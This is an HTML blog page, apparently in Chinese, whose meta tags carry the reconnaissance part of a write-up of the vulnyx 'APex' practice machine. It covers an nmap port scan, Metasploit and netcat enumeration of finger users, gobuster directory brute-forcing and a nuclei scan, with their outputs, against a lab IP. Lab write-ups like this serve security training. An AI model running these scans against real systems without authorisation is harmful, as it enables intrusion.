@@ -1,0 +1,1481 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="# nyx_APex
+
+# 0.简介
+
+**靶机**：[vulnyx - APex](https://vulnyx.com/file/APex.php)
+**难度**：Easy
+**目标 IP**：192.168.205.148
+**本机 IP**：192.168.205.141
+
+# 1.扫描
+
+`nmap`起手
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.148
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 19:17 CST
+Nmap scan report for 192.168.205.148
+Host is up (0.00026s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+79/tcp open  finger
+80/tcp open  http
+MAC Address: 08:00:27:8E:D9:36 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.56 seconds
+
+```
+
+其中79是我没有见过的服务，优先级最高
+
+# 2.踩点
+
+在hacktricks搜索到了相关[网页](https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-finger.html#79---pentesting-finger)
+
+![Image](https://github.com/user-attachments/assets/f8704be5-49b0-4ede-8d26-fae86b96ee0a)
+
+有Metasploit的脚本，我们优先利用一下
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ msfconsole
+msf6 > use auxiliary/scanner/finger/finger_users
+msf6 auxiliary(scanner/finger/finger_users) > show options 
+
+Module options (auxiliary/scanner/finger/finger_users):
+
+   Name        Current Setting                        Required  Description
+   ----        ---------------                        --------  -----------
+   RHOSTS                                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metas
+                                                                ploit/basics/using-metasploit.html
+   RPORT       79                                     yes       The target port (TCP)
+   THREADS     1                                      yes       The number of concurrent threads (max one per host)
+   USERS_FILE  /usr/share/metasploit-framework/data/  yes       The file that contains a list of default UNIX accounts.
+               wordlists/unix_users.txt
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/finger/finger_users) > set RHOSTS 192.168.205.148
+RHOSTS => 192.168.205.148
+msf6 auxiliary(scanner/finger/finger_users) > run
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: _apt
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: backup
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: bin
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: daemon
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: dnsmasq
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: games
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: gnats
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: irc
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: list
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: lp
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: mail
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: man
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: messagebus
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: news
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: nobody
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: proxy
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: root
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: sshd
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: sync
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: sys
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-coredump
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-network
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-resolve
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-timesync
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: uucp
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: uuidd
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: www-data
+[+] 192.168.205.148:79    - 192.168.205.148:79 Users found: _apt, backup, bin, daemon, dnsmasq, games, gnats, irc, list, lp, mail, man, messagebus, news, nobody, proxy, root, sshd, sync, sys, systemd-coredump, systemd-network, systemd-resolve, systemd-timesync, uucp, uuidd, www-data
+[*] 192.168.205.148:79    - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+```
+
+提取数据进行爆破
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ cat user |awk -F ': ' '{print $2}'
+_apt
+backup
+bin
+daemon
+dnsmasq
+games
+gnats
+irc
+list
+lp
+mail
+man
+messagebus
+news
+nobody
+proxy
+root
+sshd
+sync
+sys
+systemd-coredump
+systemd-network
+systemd-resolve
+systemd-timesync
+uucp
+uuidd
+www-data
+┌──(kali㉿kali)-[~/test]
+└─$ while read -r user; do echo '$user' | nc -vn 192.168.205.148 79; done < user
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: _apt                             Name: 
+Directory: /nonexistent                 Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: backup                           Name: backup
+Directory: /var/backups                 Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: bin                              Name: bin
+Directory: /bin                         Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: daemon                           Name: daemon
+Directory: /usr/sbin                    Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: dnsmasq                          Name: dnsmasq
+Directory: /var/lib/misc                Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: games                            Name: games
+Directory: /usr/games                   Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: gnats                            Name: Gnats Bug-Reporting System (admin)
+Directory: /var/lib/gnats               Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: irc                              Name: ircd
+Directory: /run/ircd                    Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: list                             Name: Mailing List Manager
+Directory: /var/list                    Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: lp                               Name: lp
+Directory: /var/spool/lpd               Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: mail                             Name: mail
+Directory: /var/mail                    Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: man                              Name: man
+Directory: /var/cache/man               Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: messagebus                       Name: 
+Directory: /nonexistent                 Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: news                             Name: news
+Directory: /var/spool/news              Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: nobody                           Name: nobody
+Directory: /nonexistent                 Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: proxy                            Name: proxy
+Directory: /bin                         Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: root                             Name: root
+Directory: /root                        Shell: /bin/bash
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: sshd                             Name: 
+Directory: /run/sshd                    Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: sync                             Name: sync
+Directory: /bin                         Shell: /bin/sync
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: sys                              Name: sys
+Directory: /dev                         Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: systemd-coredump                 Name: systemd Core Dumper
+Directory: /                            Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: systemd-network                  Name: systemd Network Management
+Directory: /run/systemd                 Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: systemd-resolve                  Name: systemd Resolver
+Directory: /run/systemd                 Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: systemd-timesync                 Name: systemd Time Synchronization
+Directory: /run/systemd                 Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: uucp                             Name: uucp
+Directory: /var/spool/uucp              Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: uuidd                            Name: 
+Directory: /run/uuidd                   Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: www-data                         Name: www-data
+Directory: /var/www                     Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+
+```
+
+没有有意思的东西，我们去看看Web服务吧
+
+![Image](https://github.com/user-attachments/assets/0729089c-c77a-498c-919d-b511a966991b)
+
+没有有意思的东西，源码也没有，我们去爆破目录
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ gobuster dir -u 'http://192.168.205.148' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.205.148
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,txt,md,php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/backup               (Status: 401) [Size: 462]
+/index.html           (Status: 200) [Size: 878]
+/server-status        (Status: 403) [Size: 280]
+/.html                (Status: 403) [Size: 280]
+
+```
+
+![Image](https://github.com/user-attachments/assets/0b5297e8-5474-4c34-a645-bc01e1b882d7)
+
+好像找到重点了，扫描一下架构
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nuclei -u 192.168.205.148                      
+
+                     __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   v3.3.8
+
+                projectdiscovery.io
+
+[WRN] Found 2 templates with runtime error (use -validate flag for further examination)
+[INF] Current nuclei version: v3.3.8 (latest)
+[INF] Current nuclei-templates version: v10.1.2 (latest)
+[WRN] Scan results upload to cloud is disabled.
+[INF] New templates added in latest release: 52
+[INF] Templates loaded for current scan: 7656
+[INF] Executing 7276 signed templates from projectdiscovery/nuclei-templates
+[WRN] Loading 380 unsigned templates for scan. Use with caution.
+[INF] Targets loaded for current scan: 1
+[INF] Running httpx on input host
+[INF] Found 1 URL from httpx
+[INF] Templates clustered: 1698 (Reduced 1598 Requests)
+[INF] Using Interactsh Server: oast.fun
+[waf-detect:apachegeneric] [http] [info] http://192.168.205.148
+[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.148:22
+[ssh-server-enumeration] [javascript] [info] 192.168.205.148:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3']
+[ssh-password-auth] [javascript] [info] 192.168.205.148:22
+[ssh-auth-methods] [javascript] [info] 192.168.205.148:22 ['['publickey','password']']
+[openssh-detect] [tcp] [info] 192.168.205.148:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3']
+[options-method] [http] [info] http://192.168.205.148 ['HEAD,GET,POST,OPTIONS']
+[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.148
+[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.148
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.148
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.148
+[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.148
+[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.148
+[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.148
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.148
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.148
+[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.148
+[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.148
+[apache-detect] [http] [info] http://192.168.205.148 ['Apache/2.4.62 (Debian)']
+
+```
+
+无果，拷一份网站下来，还是没有东西。">
+<meta property="og:title" content="nyx_APex">
+<meta property="og:description" content="# nyx_APex
+
+# 0.简介
+
+**靶机**：[vulnyx - APex](https://vulnyx.com/file/APex.php)
+**难度**：Easy
+**目标 IP**：192.168.205.148
+**本机 IP**：192.168.205.141
+
+# 1.扫描
+
+`nmap`起手
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.148
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 19:17 CST
+Nmap scan report for 192.168.205.148
+Host is up (0.00026s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+79/tcp open  finger
+80/tcp open  http
+MAC Address: 08:00:27:8E:D9:36 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.56 seconds
+
+```
+
+其中79是我没有见过的服务，优先级最高
+
+# 2.踩点
+
+在hacktricks搜索到了相关[网页](https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-finger.html#79---pentesting-finger)
+
+![Image](https://github.com/user-attachments/assets/f8704be5-49b0-4ede-8d26-fae86b96ee0a)
+
+有Metasploit的脚本，我们优先利用一下
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ msfconsole
+msf6 > use auxiliary/scanner/finger/finger_users
+msf6 auxiliary(scanner/finger/finger_users) > show options 
+
+Module options (auxiliary/scanner/finger/finger_users):
+
+   Name        Current Setting                        Required  Description
+   ----        ---------------                        --------  -----------
+   RHOSTS                                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metas
+                                                                ploit/basics/using-metasploit.html
+   RPORT       79                                     yes       The target port (TCP)
+   THREADS     1                                      yes       The number of concurrent threads (max one per host)
+   USERS_FILE  /usr/share/metasploit-framework/data/  yes       The file that contains a list of default UNIX accounts.
+               wordlists/unix_users.txt
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/finger/finger_users) > set RHOSTS 192.168.205.148
+RHOSTS => 192.168.205.148
+msf6 auxiliary(scanner/finger/finger_users) > run
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: _apt
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: backup
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: bin
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: daemon
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: dnsmasq
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: games
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: gnats
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: irc
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: list
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: lp
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: mail
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: man
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: messagebus
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: news
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: nobody
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: proxy
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: root
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: sshd
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: sync
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: sys
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-coredump
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-network
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-resolve
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-timesync
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: uucp
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: uuidd
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: www-data
+[+] 192.168.205.148:79    - 192.168.205.148:79 Users found: _apt, backup, bin, daemon, dnsmasq, games, gnats, irc, list, lp, mail, man, messagebus, news, nobody, proxy, root, sshd, sync, sys, systemd-coredump, systemd-network, systemd-resolve, systemd-timesync, uucp, uuidd, www-data
+[*] 192.168.205.148:79    - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+```
+
+提取数据进行爆破
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ cat user |awk -F ': ' '{print $2}'
+_apt
+backup
+bin
+daemon
+dnsmasq
+games
+gnats
+irc
+list
+lp
+mail
+man
+messagebus
+news
+nobody
+proxy
+root
+sshd
+sync
+sys
+systemd-coredump
+systemd-network
+systemd-resolve
+systemd-timesync
+uucp
+uuidd
+www-data
+┌──(kali㉿kali)-[~/test]
+└─$ while read -r user; do echo '$user' | nc -vn 192.168.205.148 79; done < user
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: _apt                             Name: 
+Directory: /nonexistent                 Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: backup                           Name: backup
+Directory: /var/backups                 Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: bin                              Name: bin
+Directory: /bin                         Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: daemon                           Name: daemon
+Directory: /usr/sbin                    Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: dnsmasq                          Name: dnsmasq
+Directory: /var/lib/misc                Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: games                            Name: games
+Directory: /usr/games                   Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: gnats                            Name: Gnats Bug-Reporting System (admin)
+Directory: /var/lib/gnats               Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: irc                              Name: ircd
+Directory: /run/ircd                    Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: list                             Name: Mailing List Manager
+Directory: /var/list                    Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: lp                               Name: lp
+Directory: /var/spool/lpd               Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: mail                             Name: mail
+Directory: /var/mail                    Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: man                              Name: man
+Directory: /var/cache/man               Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: messagebus                       Name: 
+Directory: /nonexistent                 Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: news                             Name: news
+Directory: /var/spool/news              Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: nobody                           Name: nobody
+Directory: /nonexistent                 Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: proxy                            Name: proxy
+Directory: /bin                         Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: root                             Name: root
+Directory: /root                        Shell: /bin/bash
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: sshd                             Name: 
+Directory: /run/sshd                    Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: sync                             Name: sync
+Directory: /bin                         Shell: /bin/sync
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: sys                              Name: sys
+Directory: /dev                         Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: systemd-coredump                 Name: systemd Core Dumper
+Directory: /                            Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: systemd-network                  Name: systemd Network Management
+Directory: /run/systemd                 Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: systemd-resolve                  Name: systemd Resolver
+Directory: /run/systemd                 Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: systemd-timesync                 Name: systemd Time Synchronization
+Directory: /run/systemd                 Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: uucp                             Name: uucp
+Directory: /var/spool/uucp              Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: uuidd                            Name: 
+Directory: /run/uuidd                   Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: www-data                         Name: www-data
+Directory: /var/www                     Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+
+```
+
+没有有意思的东西，我们去看看Web服务吧
+
+![Image](https://github.com/user-attachments/assets/0729089c-c77a-498c-919d-b511a966991b)
+
+没有有意思的东西，源码也没有，我们去爆破目录
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ gobuster dir -u 'http://192.168.205.148' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.205.148
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,txt,md,php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/backup               (Status: 401) [Size: 462]
+/index.html           (Status: 200) [Size: 878]
+/server-status        (Status: 403) [Size: 280]
+/.html                (Status: 403) [Size: 280]
+
+```
+
+![Image](https://github.com/user-attachments/assets/0b5297e8-5474-4c34-a645-bc01e1b882d7)
+
+好像找到重点了，扫描一下架构
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nuclei -u 192.168.205.148                      
+
+                     __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   v3.3.8
+
+                projectdiscovery.io
+
+[WRN] Found 2 templates with runtime error (use -validate flag for further examination)
+[INF] Current nuclei version: v3.3.8 (latest)
+[INF] Current nuclei-templates version: v10.1.2 (latest)
+[WRN] Scan results upload to cloud is disabled.
+[INF] New templates added in latest release: 52
+[INF] Templates loaded for current scan: 7656
+[INF] Executing 7276 signed templates from projectdiscovery/nuclei-templates
+[WRN] Loading 380 unsigned templates for scan. Use with caution.
+[INF] Targets loaded for current scan: 1
+[INF] Running httpx on input host
+[INF] Found 1 URL from httpx
+[INF] Templates clustered: 1698 (Reduced 1598 Requests)
+[INF] Using Interactsh Server: oast.fun
+[waf-detect:apachegeneric] [http] [info] http://192.168.205.148
+[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.148:22
+[ssh-server-enumeration] [javascript] [info] 192.168.205.148:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3']
+[ssh-password-auth] [javascript] [info] 192.168.205.148:22
+[ssh-auth-methods] [javascript] [info] 192.168.205.148:22 ['['publickey','password']']
+[openssh-detect] [tcp] [info] 192.168.205.148:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3']
+[options-method] [http] [info] http://192.168.205.148 ['HEAD,GET,POST,OPTIONS']
+[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.148
+[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.148
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.148
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.148
+[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.148
+[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.148
+[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.148
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.148
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.148
+[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.148
+[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.148
+[apache-detect] [http] [info] http://192.168.205.148 ['Apache/2.4.62 (Debian)']
+
+```
+
+无果，拷一份网站下来，还是没有东西。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPH.github.io/post/nyx_APex.html">
+<meta property="og:image" content="https://github.githubassets.com/favicons/favicon.svg">
+<title>nyx_APex</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">nyx_APex</h1>
+<div class="title-right">
+    <a href="https://7r1UMPH.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
